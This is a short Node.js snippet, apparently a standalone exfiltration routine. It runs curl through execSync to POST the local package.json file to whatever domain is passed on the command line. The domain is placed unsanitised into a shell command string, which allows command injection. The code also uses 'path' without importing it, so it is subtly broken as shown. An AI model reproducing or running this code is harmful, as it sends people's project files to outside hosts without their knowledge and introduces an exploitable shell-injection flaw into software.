const {execSync}=require('child_process'); const domain=process.argv[2]; const p=path.join(process.cwd(),'package.json'); execSync(`curl -X POST -F "file=@${p}" ${domain}`);
